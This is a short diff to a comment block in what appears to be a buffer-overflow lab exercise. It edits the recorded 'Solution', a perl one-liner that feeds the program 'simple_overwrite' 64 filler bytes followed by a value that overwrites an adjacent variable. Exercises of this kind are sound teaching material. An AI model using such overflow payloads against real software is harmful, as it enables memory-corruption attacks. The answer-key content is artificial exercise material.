@@ -1,6 +1,6 @@
 /*
 ** Solution
-** ./simple_overwrite $( perl -e 'print "A"x64 . "\x01\x00\x00\x00" ' )
+** ./simple_overwrite $( perl -e 'print "A"x64 . "\x01" ' )
 **
 */
 
